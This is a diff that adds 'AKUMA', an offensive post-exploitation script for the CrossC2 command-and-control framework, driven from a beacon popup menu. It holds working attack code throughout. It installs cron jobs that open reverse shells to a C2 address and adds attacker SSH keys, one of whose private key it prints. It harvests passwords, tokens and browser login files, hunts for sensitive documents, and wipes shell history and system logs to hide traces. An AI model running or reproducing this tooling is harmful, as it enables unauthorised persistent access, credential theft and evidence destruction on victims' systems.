@@ -1,0 +1,434 @@
+# AKUMA Linux Post-Exploitation for CrossC2
+# Compatible with CrossC2 ssh beacon popup menu
+
+# Configuration
+%akuma_config = %(
+    c2_server => "192.168.1.100",
+    backup_ports => @(4444, 5555, 6666, 7777, 8888),
+    ssh_key => "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vYZ...",
+    callback_port => 4444
+);
+
+# CrossC2 compatible popup menu - this adds to existing CrossC2Kit menu
+popup ssh {
+    separator();
+    menu "&AKUMA Linux PostEx" {
+        item "&Quick Foothold (2min)" {
+            akuma_quick_foothold($1);
+        }
+        item "&Full Deployment (5min)" {
+            akuma_full_deployment($1);
+        }
+        separator();
+        menu "&Reconnaissance" {
+            item "&System Enumeration" {
+                akuma_system_enum($1);
+            }
+            item "&Network Discovery" {
+                akuma_network_discovery($1);
+            }
+            item "&Privilege Escalation Enum" {
+                akuma_privesc_enum($1);
+            }
+        }
+        menu "&Persistence" {
+            item "&Install Cron Backdoors" {
+                akuma_cron_persistence($1);
+            }
+            item "&SSH Key Backdoor" {
+                akuma_ssh_persistence($1);
+            }
+        }
+        menu "&Data Collection" {
+            item "&Sensitive File Hunt" {
+                akuma_file_hunt($1);
+            }
+            item "&Credential Harvest" {
+                akuma_credential_harvest($1);
+            }
+        }
+        separator();
+        item "&Cleanup & Stealth" {
+            akuma_cleanup($1);
+        }
+        item "&Show Configuration" {
+            akuma_show_config($1);
+        }
+        item "&Set C2 Server IP" {
+            prompt_text("Enter C2 Server IP:", %akuma_config["c2_server"], 
+                lambda({
+                    %akuma_config["c2_server"] = $2;
+                    show_message("C2 Server updated to: " . $2);
+                }));
+        }
+    }
+}
+
+# Register SSH commands for direct use
+ssh_command_register("akuma_quick", "AKUMA Quick Foothold deployment", "Synopsis: akuma_quick\nDeploys quick persistence and enumeration");
+ssh_command_register("akuma_full", "AKUMA Full deployment", "Synopsis: akuma_full\nComplete post-exploitation deployment");
+ssh_command_register("akuma_enum", "AKUMA System enumeration", "Synopsis: akuma_enum\nBasic system enumeration");
+ssh_command_register("akuma_persist", "AKUMA Persistence only", "Synopsis: akuma_persist\nInstalls persistence mechanisms");
+ssh_command_register("akuma_creds", "AKUMA Credential harvest", "Synopsis: akuma_creds\nHarvests credentials and secrets");
+
+# SSH aliases for command line use
+ssh_alias akuma_quick {
+    akuma_quick_foothold($1);
+}
+
+ssh_alias akuma_full {
+    akuma_full_deployment($1);
+}
+
+ssh_alias akuma_enum {
+    akuma_system_enum($1);
+}
+
+ssh_alias akuma_persist {
+    akuma_cron_persistence($1);
+}
+
+ssh_alias akuma_creds {
+    akuma_credential_harvest($1);
+}
+
+# Main functions
+sub akuma_quick_foothold {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA Quick Foothold Starting...");
+    blog($bid, "🔥 AKUMA Quick Foothold Starting...");
+    
+    # Stabilization
+    bshell($bid, "export HISTFILE=/dev/null && unset HISTFILE && history -c");
+    bshell($bid, "mkdir -p /tmp/.akuma 2>/dev/null && chmod 755 /tmp/.akuma");
+    
+    # Quick persistence
+    local('$server $port');
+    $server = %akuma_config["c2_server"];
+    $port = %akuma_config["backup_ports"][0];
+    
+    blog($bid, "Installing quick persistence...");
+    bshell($bid, "(crontab -l 2>/dev/null; echo '*/10 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . $port . " 0>&1\"') | crontab -");
+    
+    # SSH key
+    bshell($bid, "mkdir -p ~/.ssh 2>/dev/null && echo '" . %akuma_config["ssh_key"] . "' >> ~/.ssh/authorized_keys 2>/dev/null && chmod 600 ~/.ssh/authorized_keys 2>/dev/null");
+    
+    # Quick enum
+    bshell($bid, "echo '=== AKUMA QUICK SYSTEM CHECK ==='");
+    bshell($bid, "whoami && hostname && uname -r");
+    bshell($bid, "id && groups");
+    bshell($bid, "ps aux | head -5");
+    
+    # Network connectivity test
+    bshell($bid, "ping -c 1 " . $server . " >/dev/null 2>&1 && echo 'C2 connectivity: OK' || echo 'C2 connectivity: FAILED'");
+    
+    blog($bid, "✅ AKUMA Quick Foothold Complete!");
+}
+
+sub akuma_full_deployment {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA Full Deployment Starting...");
+    blog($bid, "🔥 AKUMA Full Deployment Starting...");
+    blog($bid, "⏱️ Estimated time: 5 minutes");
+    
+    # Run components sequentially
+    akuma_quick_foothold($bid);
+    sleep(1000);
+    akuma_system_enum($bid);
+    sleep(1000);
+    akuma_cron_persistence($bid);
+    sleep(1000);
+    akuma_credential_harvest($bid);
+    sleep(1000);
+    akuma_network_discovery($bid);
+    
+    blog($bid, "✅ AKUMA Full Deployment Complete!");
+}
+
+sub akuma_system_enum {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA System Enumeration");
+    blog($bid, "🔍 AKUMA System Enumeration Starting...");
+    
+    bshell($bid, "echo '=== AKUMA SYSTEM FINGERPRINT ==='");
+    bshell($bid, "whoami && hostname && pwd");
+    bshell($bid, "uname -a");
+    bshell($bid, "cat /etc/os-release 2>/dev/null || cat /etc/issue");
+    bshell($bid, "uptime && date");
+    
+    bshell($bid, "echo '=== USER CONTEXT ==='");
+    bshell($bid, "id && groups");
+    bshell($bid, "sudo -l 2>/dev/null");
+    
+    bshell($bid, "echo '=== RUNNING PROCESSES ==='");
+    bshell($bid, "ps aux --sort=-%cpu | head -15");
+    
+    bshell($bid, "echo '=== NETWORK INTERFACES ==='");
+    bshell($bid, "ip addr show 2>/dev/null || ifconfig");
+    
+    bshell($bid, "echo '=== LISTENING SERVICES ==='");
+    bshell($bid, "ss -tlnp 2>/dev/null | head -15");
+    
+    bshell($bid, "echo '=== MOUNTED FILESYSTEMS ==='");
+    bshell($bid, "df -h");
+    bshell($bid, "mount | grep -v tmpfs | head -10");
+    
+    blog($bid, "✅ AKUMA System Enumeration Complete!");
+}
+
+sub akuma_network_discovery {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA Network Discovery");
+    blog($bid, "🌐 AKUMA Network Discovery Starting...");
+    
+    bshell($bid, "echo '=== NETWORK ROUTES ==='");
+    bshell($bid, "ip route 2>/dev/null | head -10");
+    bshell($bid, "route -n 2>/dev/null | head -10");
+    
+    bshell($bid, "echo '=== ARP TABLE ==='");
+    bshell($bid, "arp -a 2>/dev/null | head -20");
+    
+    bshell($bid, "echo '=== DNS CONFIGURATION ==='");
+    bshell($bid, "cat /etc/resolv.conf");
+    
+    bshell($bid, "echo '=== NETWORK CONNECTIONS ==='");
+    bshell($bid, "ss -anp 2>/dev/null | grep ESTABLISHED | head -15");
+    
+    bshell($bid, "echo '=== PING SWEEP (Common IPs) ==='");
+    bshell($bid, "ping -c 1 -W 1 192.168.1.1 >/dev/null 2>&1 && echo '192.168.1.1 alive' || echo '192.168.1.1 down'");
+    bshell($bid, "ping -c 1 -W 1 192.168.1.10 >/dev/null 2>&1 && echo '192.168.1.10 alive' || echo '192.168.1.10 down'");
+    bshell($bid, "ping -c 1 -W 1 192.168.1.100 >/dev/null 2>&1 && echo '192.168.1.100 alive' || echo '192.168.1.100 down'");
+    bshell($bid, "ping -c 1 -W 1 10.0.0.1 >/dev/null 2>&1 && echo '10.0.0.1 alive' || echo '10.0.0.1 down'");
+    
+    bshell($bid, "echo '=== PORT SCAN LOCALHOST ==='");
+    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/localhost/22' 2>/dev/null && echo 'SSH (22) open'");
+    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/localhost/80' 2>/dev/null && echo 'HTTP (80) open'");
+    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/localhost/443' 2>/dev/null && echo 'HTTPS (443) open'");
+    bshell($bid, "timeout 1 bash -c 'cat < /dev/null > /dev/tcp/localhost/3306' 2>/dev/null && echo 'MySQL (3306) open'");
+    
+    blog($bid, "✅ AKUMA Network Discovery Complete!");
+}
+
+sub akuma_cron_persistence {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA Cron Persistence");
+    blog($bid, "🔒 AKUMA Cron Persistence Starting...");
+    
+    local('$server @ports');
+    $server = %akuma_config["c2_server"];
+    @ports = %akuma_config["backup_ports"];
+    
+    blog($bid, "Installing cron persistence mechanisms...");
+    
+    # Main persistence
+    bshell($bid, "(crontab -l 2>/dev/null; echo '*/15 * * * * /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[0] . " 0>&1\"') | crontab -");
+    
+    # Reboot persistence
+    bshell($bid, "(crontab -l 2>/dev/null; echo '@reboot sleep 60 && /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[1] . " 0>&1\"') | crontab -");
+    
+    # System-wide (if root)
+    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then echo '*/20 * * * * root /bin/bash -c \"bash -i >& /dev/tcp/" . $server . "/" . @ports[2] . " 0>&1\"' >> /etc/crontab 2>/dev/null && echo 'System-wide cron installed'; else echo 'User-level cron only (not root)'; fi");
+    
+    # Verify installation
+    bshell($bid, "echo '=== PERSISTENCE VERIFICATION ==='");
+    bshell($bid, "crontab -l 2>/dev/null | grep -E 'bash.*tcp' | wc -l | awk '{print \"User cron jobs installed: \" $1}'");
+    
+    blog($bid, "✅ AKUMA Cron Persistence Complete!");
+}
+
+sub akuma_ssh_persistence {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA SSH Persistence");
+    blog($bid, "🔑 AKUMA SSH Persistence Starting...");
+    
+    bshell($bid, "echo 'Generating SSH key pair...'");
+    bshell($bid, "ssh-keygen -t rsa -b 2048 -f ~/.ssh/akuma_key -N '' -C 'akuma@system' 2>/dev/null");
+    bshell($bid, "cat ~/.ssh/akuma_key.pub >> ~/.ssh/authorized_keys 2>/dev/null");
+    bshell($bid, "chmod 600 ~/.ssh/authorized_keys ~/.ssh/akuma_key 2>/dev/null");
+    bshell($bid, "chmod 644 ~/.ssh/akuma_key.pub 2>/dev/null");
+    
+    bshell($bid, "echo '=== SSH BACKDOOR PRIVATE KEY ==='");
+    bshell($bid, "echo 'Save this private key for SSH access:'");
+    bshell($bid, "cat ~/.ssh/akuma_key");
+    bshell($bid, "echo '=== END PRIVATE KEY ==='");
+    
+    bshell($bid, "echo 'SSH persistence installed. Use: ssh -i akuma_key " . "$(whoami)@$(hostname -I | awk '{print $1}')" . "'");
+    
+    blog($bid, "✅ AKUMA SSH Persistence Complete! Private key displayed above.");
+}
+
+sub akuma_file_hunt {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA File Hunt");
+    blog($bid, "🗂️ AKUMA Sensitive File Hunt Starting...");
+    
+    bshell($bid, "echo '=== SENSITIVE FILE HUNT ==='");
+    
+    bshell($bid, "echo '=== DOCUMENTS ==='");
+    bshell($bid, "find /home -type f -name '*.pdf' 2>/dev/null | head -20");
+    bshell($bid, "find /home -type f -name '*.doc*' 2>/dev/null | head -20");
+    bshell($bid, "find /home -type f -name '*.xls*' 2>/dev/null | head -20");
+    bshell($bid, "find /home -type f -name '*.txt' 2>/dev/null | head -20");
+    
+    bshell($bid, "echo '=== SSH KEYS ==='");
+    bshell($bid, "find /home -type f -name 'id_*' 2>/dev/null | head -10");
+    bshell($bid, "find /home -type f -name '*.pem' 2>/dev/null | head -10");
+    bshell($bid, "find /home -type f -name 'authorized_keys' 2>/dev/null");
+    
+    bshell($bid, "echo '=== CONFIGURATION FILES ==='");
+    bshell($bid, "find /home -type f -name '*.conf' 2>/dev/null | head -15");
+    bshell($bid, "find /home -type f -name '*.config' 2>/dev/null | head -15");
+    bshell($bid, "find /home -type f -name '.env' 2>/dev/null");
+    
+    bshell($bid, "echo '=== ARCHIVES ==='");
+    bshell($bid, "find /home -type f -name '*.zip' 2>/dev/null | head -15");
+    bshell($bid, "find /home -type f -name '*.tar*' 2>/dev/null | head -15");
+    bshell($bid, "find /home -type f -name '*.rar' 2>/dev/null | head -15");
+    
+    blog($bid, "✅ AKUMA File Hunt Complete!");
+}
+
+sub akuma_credential_harvest {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA Credential Harvest");
+    blog($bid, "🔐 AKUMA Credential Harvest Starting...");
+    
+    bshell($bid, "echo '=== AKUMA CREDENTIAL HARVEST ==='");
+    
+    bshell($bid, "echo '=== COMMAND HISTORY SECRETS ==='");
+    bshell($bid, "cat ~/.bash_history 2>/dev/null | grep -i pass | tail -20");
+    bshell($bid, "cat ~/.bash_history 2>/dev/null | grep -i secret | tail -20");
+    bshell($bid, "cat ~/.bash_history 2>/dev/null | grep -i key | tail -20");
+    bshell($bid, "cat ~/.zsh_history 2>/dev/null | grep -i pass | tail -20");
+    
+    bshell($bid, "echo '=== ENVIRONMENT VARIABLES ==='");
+    bshell($bid, "env | grep -i pass 2>/dev/null");
+    bshell($bid, "env | grep -i secret 2>/dev/null");
+    bshell($bid, "env | grep -i key 2>/dev/null");
+    bshell($bid, "env | grep -i token 2>/dev/null");
+    bshell($bid, "env | grep -i api 2>/dev/null");
+    
+    bshell($bid, "echo '=== BROWSER DATA ==='");
+    bshell($bid, "find /home -path '*/.mozilla/firefox/*/places.sqlite' 2>/dev/null");
+    bshell($bid, "find /home -path '*/.mozilla/firefox/*/logins.json' 2>/dev/null");
+    bshell($bid, "find /home -path '*/.config/google-chrome/*/Login Data' 2>/dev/null");
+    bshell($bid, "find /home -path '*/.config/chromium/*/Login Data' 2>/dev/null");
+    
+    bshell($bid, "echo '=== PASSWORD FILES ==='");
+    bshell($bid, "find /home -type f -name '*password*' 2>/dev/null | head -10");
+    bshell($bid, "find /home -type f -name '*passwd*' 2>/dev/null | head -10");
+    bshell($bid, "find /home -type f -name '*credential*' 2>/dev/null | head -10");
+    
+    bshell($bid, "echo '=== SUDO CACHED CREDENTIALS ==='");
+    bshell($bid, "sudo -n true 2>/dev/null && echo 'sudo credentials cached!' || echo 'No cached sudo credentials'");
+    
+    blog($bid, "✅ AKUMA Credential Harvest Complete!");
+}
+
+sub akuma_privesc_enum {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA Privilege Escalation Enumeration");
+    blog($bid, "🚀 AKUMA Privilege Escalation Enumeration Starting...");
+    
+    bshell($bid, "echo '=== AKUMA PRIVESC ENUMERATION ==='");
+    
+    bshell($bid, "echo '=== CURRENT PRIVILEGES ==='");
+    bshell($bid, "id && groups");
+    bshell($bid, "sudo -l 2>/dev/null");
+    
+    bshell($bid, "echo '=== SUID/SGID BINARIES ==='");
+    bshell($bid, "find / -perm -4000 -type f 2>/dev/null | head -30");
+    
+    bshell($bid, "echo '=== WORLD WRITABLE DIRECTORIES ==='");
+    bshell($bid, "find / -writable -type d 2>/dev/null | grep -v proc | grep -v sys | head -20");
+    
+    bshell($bid, "echo '=== INTERESTING WRITABLE FILES ==='");
+    bshell($bid, "find / -writable -type f 2>/dev/null | grep -E '(passwd|shadow|sudoers|crontab)' 2>/dev/null");
+    
+    bshell($bid, "echo '=== CRON JOBS ==='");
+    bshell($bid, "crontab -l 2>/dev/null");
+    bshell($bid, "cat /etc/crontab 2>/dev/null");
+    bshell($bid, "ls -la /etc/cron.* 2>/dev/null");
+    
+    bshell($bid, "echo '=== ROOT PROCESSES ==='");
+    bshell($bid, "ps aux | grep '^root' | head -20");
+    
+    bshell($bid, "echo '=== KERNEL VERSION ==='");
+    bshell($bid, "uname -a");
+    bshell($bid, "cat /proc/version");
+    
+    blog($bid, "✅ AKUMA PrivEsc Enumeration Complete!");
+}
+
+sub akuma_cleanup {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA Cleanup & Stealth");
+    blog($bid, "🧹 AKUMA Cleanup & Stealth Starting...");
+    
+    bshell($bid, "echo '=== CLEANING UP TRACES ==='");
+    
+    bshell($bid, "echo 'Clearing command history...'");
+    bshell($bid, "> ~/.bash_history");
+    bshell($bid, "> ~/.zsh_history");
+    bshell($bid, "history -c");
+    bshell($bid, "export HISTFILE=/dev/null");
+    bshell($bid, "unset HISTFILE");
+    bshell($bid, "set +o history");
+    
+    bshell($bid, "echo 'Removing temporary files...'");
+    bshell($bid, "rm -rf /tmp/.akuma* 2>/dev/null");
+    bshell($bid, "rm -rf /var/tmp/.akuma* 2>/dev/null");
+    
+    bshell($bid, "echo 'Attempting system log cleanup (requires root)...'");
+    bshell($bid, "if [ \"$EUID\" -eq 0 ]; then");
+    bshell($bid, "  echo 'Root detected - clearing system logs'");
+    bshell($bid, "  > /var/log/auth.log 2>/dev/null");
+    bshell($bid, "  > /var/log/secure 2>/dev/null");
+    bshell($bid, "  > /var/log/messages 2>/dev/null");
+    bshell($bid, "  > /var/log/syslog 2>/dev/null");
+    bshell($bid, "  echo 'System logs cleared'");
+    bshell($bid, "else");
+    bshell($bid, "  echo 'Need root privileges for system log cleanup'");
+    bshell($bid, "fi");
+    
+    bshell($bid, "echo 'Enabling stealth mode...'");
+    bshell($bid, "echo 3 > /proc/sys/vm/drop_caches 2>/dev/null || echo 'Cannot clear memory caches (need root)'");
+    
+    blog($bid, "✅ AKUMA Cleanup & Stealth Complete!");
+}
+
+sub akuma_show_config {
+    local('$bid');
+    $bid = $1;
+    
+    binput($bid, "# AKUMA Configuration");
+    blog($bid, "⚙️ AKUMA Configuration:");
+    blog($bid, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+    blog($bid, "C2 Server: " . %akuma_config["c2_server"]);
+    blog($bid, "Backup Ports: " . join(", ", %akuma_config["backup_ports"]));
+    blog($bid, "Callback Port: " . %akuma_config["callback_port"]);
+    blog($bid, "SSH Key: " . substr(%akuma_config["ssh_key"], 0, 50) . "...");
+    blog($bid, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
+}
+
+blog("🔥 AKUMA Linux PostEx for CrossC2 Loaded! Right-click on beacon to see menu or use commands: akuma_quick, akuma_full, akuma_enum, akuma_persist, akuma_creds");
